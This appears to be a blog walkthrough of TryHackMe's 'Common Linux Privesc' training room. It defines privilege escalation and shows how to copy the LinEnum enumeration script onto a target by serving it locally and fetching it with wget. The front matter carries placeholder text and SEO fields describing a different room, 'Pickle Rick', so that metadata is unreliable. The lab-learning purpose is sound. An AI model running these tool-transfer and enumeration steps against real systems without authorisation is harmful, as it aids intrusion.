---
title: TryHackMe - Common Linux Privesc
subtitle: lorem-ipsum
date: '2021-10-27'
thumb_img_alt: lorem-ipsum
content_img_alt: Icelandic horses
excerpt: Follow along with this "Easy" rated box on TryHackMe to save Pickle Rick.
seo:
  title: Pickle Rick Walkthrough - Easy
  description: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
  extra:
    - name: 'og:type'
      value: article
      keyName: property
    - name: 'og:title'
      value: Pickle Rick CTF Walkthrough - Easy
      keyName: property
    - name: 'og:description'
      value: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
      keyName: property
    - name: 'og:image'
      value: /images/o9pyhyU.jpg
      keyName: property
      relativeUrl: true
    - name: 'twitter:card'
      value: summary_large_image
    - name: 'twitter:title'
      value: Pickle Rick CTF Walkthrough - Easy
    - name: 'twitter:description'
      value: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
    - name: 'twitter:image'
      value: /images/o9pyhyU.jpg
      relativeUrl: true
layout: post
thumb_img_path: /images/o9pyhyU.jpg
content_img_path: /images/banner.png
---
TryHackMe - Common Linux Privesc (Privilege Escalation): <https://tryhackme.com/room/commonlinuxprivesc>

This box is listed as Easy .  It provides walk-throughs and practice of common linux privilege escalation vectors.

# TASKS 1 - 3 | What is Privesc?

Let's start by discussing what "privesc" is.  Essentially, privesc (privilege escalation) is leveraging access to a low pricilege account to move to a higer privilege account (eg user to root).  Privesc can occur in two directions: horizontal and vertical.  In horizontal privesc, access is gained to an account of the same privilege level. This can be beneficial to access private files or if the new user has SUIDs we can exploit.  In vertical privesc, access is gained to an account with more access to the system (admin / root).  Read through the provided information in each of the three tasks and complete each section.

# TASK 4 | ENUMERATION

## LinEnum

LinEnum is a bash script which performs common commands related to privesc.  It can be downloaded from:

<https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh>

Two ways to get LinEnum onto the target machine:

First - start a python webserver from the directory with your copy of LinEnum.sh. (python3 -m http.server 8000).  Then, wget the file from the target machine (wget \[LOCAL_IP]:8000/LinEnum.sh).  After it has been transfered to the target machine, make the file executable (chmod +x LinEnum.sh).

Second - Provided you have the required permissions, copy the raw code and create a .sh file in vi/nano/etc and paste the code.  Make the file executable.

LinEnum can be run as \`./LinEnum.sh\`

